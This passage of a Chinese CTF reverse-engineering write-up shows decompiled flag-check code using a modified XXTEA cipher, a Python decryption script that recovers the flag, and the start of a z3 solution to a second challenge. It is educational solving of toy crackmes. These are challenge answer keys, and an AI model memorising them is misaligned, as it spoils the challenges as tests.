  <span class="token keyword">int</span> i_0<span class="token punctuation">;</span> <span class="token comment">// [rsp+FCh] [rbp+7Ch]</span>

  <span class="token function">_main</span><span class="token punctuation">(</span>argc<span class="token punctuation">,</span> argv<span class="token punctuation">,</span> envp<span class="token punctuation">)</span><span class="token punctuation">;</span>
  n1 <span class="token operator">=</span> <span class="token number">18</span><span class="token punctuation">;</span>
  v11 <span class="token operator">=</span> <span class="token number">17</span>i64<span class="token punctuation">;</span>
  v3 <span class="token operator">=</span> <span class="token function">alloca</span><span class="token punctuation">(</span><span class="token number">80</span>i64<span class="token punctuation">)</span><span class="token punctuation">;</span>
  p_v1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64<span class="token punctuation">)</span>v2 <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">&gt;&gt;</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v4 <span class="token operator">=</span> p_v1<span class="token punctuation">;</span>
  <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>p_v1 <span class="token operator">=</span> <span class="token number">0x8302845</span><span class="token punctuation">;</span>
  v4 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v4 <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>v4 <span class="token operator">=</span> <span class="token number">0xA69B29D8</span><span class="token punctuation">;</span>
  v4 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v4 <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>v4 <span class="token operator">=</span> <span class="token number">0x2B3247E3</span><span class="token punctuation">;</span>
  <span class="token comment">//略</span>
  <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>v4 <span class="token operator">=</span> <span class="token number">0x2C97F1C0</span><span class="token punctuation">;</span>
  <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>v4 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0xABB9B744</span><span class="token punctuation">;</span>
  k<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">73</span><span class="token punctuation">;</span>
  k<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">83</span><span class="token punctuation">;</span>
  k<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">67</span><span class="token punctuation">;</span>
  k<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">67</span><span class="token punctuation">;</span>
  <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> v<span class="token punctuation">)</span><span class="token punctuation">;</span>
  n <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> n <span class="token operator">==</span> n1 <span class="token punctuation">)</span>
  <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>
      v2<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token function">encode</span><span class="token punctuation">(</span>v2<span class="token punctuation">,</span> n<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span> i_0 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i_0 <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i_0 <span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>p_v1 <span class="token operator">+</span> i_0<span class="token punctuation">)</span> <span class="token operator">!=</span> v2<span class="token punctuation">[</span>i_0<span class="token punctuation">]</span> <span class="token punctuation">)</span>
        <span class="token keyword">goto</span> LABEL_2<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Your input is the right answer!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">else</span>
  <span class="token punctuation">{<!-- --></span>
LABEL_2<span class="token operator">:</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Wrong answer!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>跟进encode(v2, n, k)</p>
<pre><code class="prism language-cpp"><span class="token keyword">void</span> __cdecl <span class="token function">encode</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span>v<span class="token punctuation">,</span> <span class="token keyword">int</span> n<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">int</span> <span class="token operator">*</span>key<span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
  <span class="token keyword">int</span> <span class="token operator">*</span>v4<span class="token punctuation">;</span> <span class="token comment">// rax</span>
  <span class="token keyword">int</span> <span class="token operator">*</span>v5<span class="token punctuation">;</span> <span class="token comment">// rax</span>
  <span class="token keyword">int</span> y<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-18h]</span>
  <span class="token keyword">int</span> e<span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-14h]</span>
  <span class="token keyword">int</span> rounds<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-10h]</span>
  <span class="token keyword">int</span> p<span class="token punctuation">;</span> <span class="token comment">// [rsp+14h] [rbp-Ch]</span>
  <span class="token keyword">int</span> sum<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-8h]</span>
  <span class="token keyword">int</span> z<span class="token punctuation">;</span> <span class="token comment">// [rsp+1Ch] [rbp-4h]</span>

  rounds <span class="token operator">=</span> <span class="token number">52</span> <span class="token operator">/</span> n <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">;</span>
  sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span> z <span class="token operator">=</span> v<span class="token punctuation">[</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span> rounds<span class="token operator">--</span><span class="token punctuation">;</span> z <span class="token operator">=</span> <span class="token operator">*</span>v5 <span class="token punctuation">)</span>
  <span class="token punctuation">{<!-- --></span>
    sum <span class="token operator">-=</span> <span class="token number">1640531527</span><span class="token punctuation">;</span>
    e <span class="token operator">=</span> <span class="token punctuation">(</span>sum <span class="token operator">&gt;&gt;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span> p <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> p <span class="token operator">&lt;</span> n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token operator">++</span>p <span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
      y <span class="token operator">=</span> v<span class="token punctuation">[</span>p <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
      v4 <span class="token operator">=</span> <span class="token operator">&amp;</span>v<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">;</span>
      <span class="token operator">*</span>v4 <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>y <span class="token operator">^</span> sum<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>z <span class="token operator">^</span> key<span class="token punctuation">[</span>e <span class="token operator">^</span> p <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">*</span> y<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>z <span class="token operator">&gt;&gt;</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>y <span class="token operator">&gt;&gt;</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token number">16</span> <span class="token operator">*</span> z<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      z <span class="token operator">=</span> <span class="token operator">*</span>v4<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    v5 <span class="token operator">=</span> <span class="token operator">&amp;</span>v<span class="token punctuation">[</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token operator">*</span>v5 <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span>v <span class="token operator">^</span> sum<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>z <span class="token operator">^</span> key<span class="token punctuation">[</span>e <span class="token operator">^</span> p <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">*</span> <span class="token operator">*</span>v<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>z <span class="token operator">&gt;&gt;</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span>v <span class="token operator">&gt;&gt;</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token number">16</span> <span class="token operator">*</span> z<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>积累特征！，变异的xxtea加密<br/> 嫖一个<a href="https://blog.csdn.net/A951860555/article/details/120120400">大佬的脚本</a><br/> 自己改下MX函数</p>
<pre><code class="prism language-python"><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span>

<span class="token keyword">def</span> <span class="token function">sar</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span> 
    <span class="token keyword">if</span> i<span class="token operator">&gt;</span><span class="token number">0x7fffffff</span><span class="token punctuation">:</span> 
        c <span class="token operator">=</span> i<span class="token operator">&gt;&gt;</span>index 
        m <span class="token operator">=</span> <span class="token builtin">bin</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span> 
        m <span class="token operator">=</span> <span class="token string">'1'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token operator">-</span><span class="token builtin">len</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> m 
        <span class="token keyword">return</span> <span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>  
    <span class="token keyword">else</span><span class="token punctuation">:</span> 
        <span class="token keyword">return</span> i<span class="token operator">&gt;&gt;</span>index
     
<span class="token keyword">def</span> <span class="token function">MX</span><span class="token punctuation">(</span>z<span class="token punctuation">,</span> y<span class="token punctuation">,</span> total<span class="token punctuation">,</span> key<span class="token punctuation">,</span> p<span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">:</span> 
    temp1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>sar<span class="token punctuation">(</span>z<span class="token punctuation">.</span>value<span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>y<span class="token punctuation">.</span>value<span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>sar<span class="token punctuation">(</span>y<span class="token punctuation">.</span>value<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token number">16</span><span class="token operator">*</span>z<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span> 
    temp2 <span class="token operator">=</span> <span class="token punctuation">(</span>total<span class="token punctuation">.</span>value <span class="token operator">^</span> y<span class="token punctuation">.</span>value<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>key<span class="token punctuation">[</span>e<span class="token punctuation">.</span>value<span class="token operator">^</span>p<span class="token operator">&amp;</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">^</span> z<span class="token punctuation">.</span>value<span class="token punctuation">)</span> 
    <span class="token keyword">return</span> c_uint32<span class="token punctuation">(</span>temp1 <span class="token operator">^</span> temp2<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> v<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>
    delta <span class="token operator">=</span> <span class="token number">0x9e3779b9</span>
    rounds <span class="token operator">=</span> <span class="token number">6</span> <span class="token operator">+</span> <span class="token number">52</span><span class="token operator">//</span>n 

    total <span class="token operator">=</span> c_uint32<span class="token punctuation">(</span>rounds <span class="token operator">*</span> delta<span class="token punctuation">)</span>
    y <span class="token operator">=</span> c_uint32<span class="token punctuation">(</span>v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    e <span class="token operator">=</span> c_uint32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

    <span class="token keyword">while</span> rounds <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">:</span>
        e<span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token punctuation">(</span>total<span class="token punctuation">.</span>value <span class="token operator">&gt;&gt;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">3</span>
        <span class="token keyword">for</span> p <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            z <span class="token operator">=</span> c_uint32<span class="token punctuation">(</span>v<span class="token punctuation">[</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
            v<span class="token punctuation">[</span>p<span class="token punctuation">]</span> <span class="token operator">=</span> c_uint32<span class="token punctuation">(</span><span class="token punctuation">(</span>v<span class="token punctuation">[</span>p<span class="token punctuation">]</span> <span class="token operator">-</span> MX<span class="token punctuation">(</span>z<span class="token punctuation">,</span>y<span class="token punctuation">,</span>total<span class="token punctuation">,</span>key<span class="token punctuation">,</span>p<span class="token punctuation">,</span>e<span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value
            y<span class="token punctuation">.</span>value <span class="token operator">=</span> v<span class="token punctuation">[</span>p<span class="token punctuation">]</span>
        z <span class="token operator">=</span> c_uint32<span class="token punctuation">(</span>v<span class="token punctuation">[</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  
        v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> c_uint32<span class="token punctuation">(</span>v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">-</span> MX<span class="token punctuation">(</span>z<span class="token punctuation">,</span>y<span class="token punctuation">,</span>total<span class="token punctuation">,</span>key<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>e<span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">.</span>value
        y<span class="token punctuation">.</span>value <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>  
        total<span class="token punctuation">.</span>value <span class="token operator">-=</span> delta
        rounds <span class="token operator">-=</span> <span class="token number">1</span>
    <span class="token keyword">return</span> v

v <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x8302845</span><span class="token punctuation">,</span><span class="token number">0xA69B29D8</span><span class="token punctuation">,</span><span class="token number">0x2B3247E3</span><span class="token punctuation">,</span><span class="token number">0x4D7E46D</span><span class="token punctuation">,</span><span class="token number">0x59AF7720</span><span class="token punctuation">,</span><span class="token number">0xB2AB65D3</span><span class="token punctuation">,</span>
     <span class="token number">0xC96FBBDA</span><span class="token punctuation">,</span><span class="token number">0x9E04492B</span><span class="token punctuation">,</span><span class="token number">0x1613C277</span><span class="token punctuation">,</span><span class="token number">0x31E6AB85</span><span class="token punctuation">,</span><span class="token number">0x210EE77C</span><span class="token punctuation">,</span><span class="token number">0xE5B9DBA8</span><span class="token punctuation">,</span>
     <span class="token number">0x47620E35</span><span class="token punctuation">,</span><span class="token number">0x6F46E1BC</span><span class="token punctuation">,</span><span class="token number">0x83EA18FC</span><span class="token punctuation">,</span><span class="token number">0xE137268</span><span class="token punctuation">,</span><span class="token number">0x2C97F1C0</span><span class="token punctuation">,</span><span class="token number">0xABB9B744</span><span class="token punctuation">]</span> 
k <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">73</span><span class="token punctuation">,</span> <span class="token number">83</span><span class="token punctuation">,</span> <span class="token number">67</span><span class="token punctuation">,</span> <span class="token number">67</span><span class="token punctuation">]</span> 
n <span class="token operator">=</span> <span class="token number">18</span> 
res <span class="token operator">=</span> decrypt<span class="token punctuation">(</span>n<span class="token punctuation">,</span> v<span class="token punctuation">,</span> k<span class="token punctuation">)</span> 
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span> 
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>res<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span> 


</code></pre>
<h3><a id="_709"></a>解题收获</h3>
<p>移位不能溢出</p>
<h2><a id="Sad_Code_711"></a>Sad Code</h2>
<h3><a id="_712"></a>解题步骤</h3>
<p>z3永远滴神</p>
<h3><a id="_714"></a>详细描述</h3>
<p>main函数()</p>
<pre><code class="prism language-cpp">……………………………略………………………………………
  <span class="token keyword">if</span> <span class="token punctuation">(</span> v16<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">7</span> <span class="token operator">*</span> v16<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">4</span> <span class="token operator">*</span> v15 <span class="token operator">-</span> <span class="token number">2</span> <span class="token operator">*</span> v16<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0x1E7D3CEE2</span>i64
    <span class="token operator">&amp;&amp;</span> <span class="token number">5</span> <span class="token operator">*</span> v16<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">3</span> <span class="token operator">*</span> v16<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">-</span> v16<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">2</span> <span class="token operator">*</span> v15 <span class="token operator">==</span> <span class="token number">0x199F3C545</span>i64
    <span class="token operator">&amp;&amp;</span> <span class="token number">2</span> <span class="token operator">*</span> v16<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> v16<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">10</span> <span class="token operator">*</span> v15 <span class="token operator">-</span> <span class="token number">5</span> <span class="token operator">*</span> v16<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0x4C5932702</span>i64
    <span class="token operator">&amp;&amp;</span> <span class="token number">7</span> <span class="token operator">*</span> v15 <span class="token operator">+</span> <span class="token number">15</span> <span class="token operator">*</span> v16<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">3</span> <span class="token operator">*</span> v16<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">2</span> <span class="token operator">*</span> v16<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0x791A6DB34</span>i64 <span class="token punctuation">)</span>
  <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">15</span> <span class="token operator">*</span> v16<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">35</span> <span class="token operator">*</span> v16<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">-</span> v16<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">-</span> v16<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0xDFD78083C</span>i64
      <span class="token operator">&amp;&amp;</span> <span class="token number">38</span> <span class="token operator">*</span> v16<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">+</span> v16<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">+</span> v16<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">24</span> <span class="token operator">*</span> v16<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0x48E39C1B6</span>i64
      <span class="token operator">&amp;&amp;</span> <span class="token number">38</span> <span class="token operator">*</span> v16<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">32</span> <span class="token operator">*</span> v16<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">-</span> v16<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">-</span> v16<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0x149942A1B3</span>i64
      <span class="token operator">&amp;&amp;</span> v16<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">41</span> <span class="token operator">*</span> v16<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">-</span> v16<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">25</span> <span class="token operator">*</span> v16<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0x54FD4EE4A</span>i64 <span class="token punctuation">)</span>
……………………………略………………………………………
</code></pre>
<p>z3解个方程</p>
<pre><code class="prism language-python"><span class="token keyword">from</span> z3 <span class="token keyword">import</span> <span class="token operator">*</span>

s<span class="token operator">=</span>Solver<span class="token punctuation">(</span><span class="token punctuation">)</span>
v16 <span class="token operator">=</span> IntVector<span class="token punctuation">(</span><span class="token string">'v16%s'</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span>

s<span class="token punctuation">.</span>add<span class="token punctuation">(</span>v16<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">7</span> <span class="token operator">*</span> v16<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">4</span> <span class="token operator">*</span> v16<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">2</span> <span class="token operator">*</span> v16<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0x1E7D3CEE2</span><span class="token punctuation">)</span>
s<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">5</span> <span class="token operator">*</span> v16<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">3</span> <span class="token operator">*</span> v16<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">-</span> v16<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">2</span> <span class="token operator">*</span> v16<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0x199F3C545</span><span class="token punctuation">)</span>
s<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> v16<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> v16<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">10</span> <span class="token operator">*</span> v16<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">5</span> <span class="token operator">*</span> v16<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0x4C5932702</span><span class="token punctuation">)</span>
s<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">7</span> <span class="token operator">*</span> v16<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">15</span> <span class="token operator">*</span> v16<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">3</span> <span class="token operator">*</span> v16<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">2</span> <span class="token operator">*</span> v16<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0x791A6DB34</span><span class="token punctuation">)</span>
